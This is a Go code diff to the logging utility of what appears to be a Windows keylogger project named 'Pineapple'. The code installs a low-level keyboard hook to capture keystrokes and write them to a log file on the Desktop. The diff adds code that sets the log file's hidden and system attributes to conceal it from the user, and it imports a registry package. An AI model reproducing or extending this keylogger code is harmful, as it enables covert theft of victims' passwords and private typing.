@@ -2,10 +2,13 @@ package utils
 
 import (
 	"os"
+	"path"
 	"strings"
+	"syscall"
 	"unsafe"
 
 	"github.com/MShoaei/Pineapple/windows"
+	_ "golang.org/x/sys/windows/registry"
 )
 
 var shift bool
@@ -14,10 +17,17 @@ var buffer strings.Builder
 var logFilePath string
 var logFile *os.File
 
+//var selfPath string
+
 func init() {
-	logFilePath = Join(os.Getenv("USERPROFILE"), "Desktop", "log.txt")
+	logFilePath = path.Join(os.Getenv("USERPROFILE"), "Desktop", "log.txt")
 	if _, err := os.Stat(logFilePath); os.IsNotExist(err) {
 		logFile, _ = os.Create(logFilePath)
+		namePtr, _ := syscall.UTF16PtrFromString(logFilePath)
+		err := windows.SetFileAttributes(namePtr, windows.FILE_ATTRIBUTE_HIDDEN|windows.FILE_ATTRIBUTE_SYSTEM)
+		if err != nil {
+			panic(err)
+		}
 	} else {
 		logFile, _ = os.OpenFile(logFilePath, os.O_WRONLY|os.O_APPEND, os.ModeExclusive)
 	}
@@ -26,7 +36,7 @@ func init() {
 }
 
 func Flush() {
-	logFile.WriteString(buffer.String())
+	_, _ = logFile.WriteString(buffer.String())
 	buffer.Reset()
 }
 
@@ -35,10 +45,10 @@ func Log(nCode int, wParam windows.WPARAM, lParam uintptr) windows.LRESULT {
 	//WM_KEYDOWN 0x100
 	if nCode == 0 && wParam == 0x100 {
 		key := (*windows.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
-		shiftchk := (windows.GetAsyncKeyState(windows.VKLSHIFT) & 0x8000) |
+		shiftCheck := (windows.GetAsyncKeyState(windows.VKLSHIFT) & 0x8000) |
 			(windows.GetAsyncKeyState(windows.VKRSHIFT) & 0x8000) |
 			(windows.GetAsyncKeyState(windows.VKSHIFT) & 0x8000)
-		if shiftchk == 32768 {
+		if shiftCheck == 32768 {
 			shift = true
 		} else {
 			shift = false
